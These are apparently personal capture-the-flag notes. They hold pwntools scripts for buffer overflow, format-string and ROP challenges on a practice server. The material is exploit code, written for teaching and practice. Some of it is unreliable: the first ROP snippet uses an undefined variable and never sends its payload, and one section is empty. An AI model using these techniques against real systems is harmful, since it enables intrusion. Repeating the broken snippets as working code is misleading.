============ overflow > variable
# code
buf[8]

# exploit
from pwn import *
io = remote("ctf.cybr.club", 443, ssl=True, sni="bof-var")
io.sendline(b"AAAAAAAA" + p64(0x04206969))
	- or + b'\x69\x69\x20\x04'
io.interactive(prompt="")


============ overflow > function
# get address of win()
objdump -x <executable> | grep win

# have to overwrite buf and base pointer, both 8 bytes
buf[8]

# exploit
from pwn import *
io = remote("ctf.cybr.club", 443, ssl=True, sni="bof-rip")
io.sendline(b"AAAAAAAAAAAAAAAA" + p64(0x004011b5))
io.interactive(prompt="")

============== overflow > shell 
# print(shellcraft.sh())
# exploit

============== printf format read
- what are printf format strings?
%p: takes off 8 bytes from the stack
%p%p%p%p
$1%p
%p %1$p
	- offset 1 of p
%9$p
	- swap endianess - 8 bytes

============== printf format write
from pwn import *
elf = ELF('./format_write')
context.binary = elf
context.log_level = "debug"
io = remote("ctf.cybr.club", 443, ssl=True, sni="format-write")
a = p64(elf.sym['a'])
payload = b'AAAAAAAA%8$nAAAA' + a
io.sendline(payload)
io.interactive()

================= rop
from pwn import *
elf = ELF('./rop')
context.binary = elf
context.log_level = "debug"
io = remote("ctf.cybr.club", 443, ssl=True, sni="rop")
load = elf.sym(['load_flag'])
puts = elf.sym(['print_flag'])
payload = b'A' * 16
payload += p64(load_flag)
payload += p64(puts)
io.interactive(prompt="")

================== rop 2
# get variable addresses
ROPgadget --binary=./rop2 | grep ret

# get function addresses
objdump -x rop2 | grep check
objdump -x rop2 | grep win

# exploit
from pwn import *

context.log_level = "debug"
io = remote("ctf.cybr.club", 443, ssl=True, sni="rop2")
rdi = p64(0x4011c9)
rsi = p64(0x4011cb)
rdx = p64(0x4011cd)
check = p64(0x401233)
win = p64(0x4011d2)
payload = b'A'*16
payload += rdi + p64(1)
payload += rsi + p64(2)
payload += rdx + p64(3)
payload += check
payload += win
io.recvline()
io.sendline(payload)
io.interactive(prompt="")
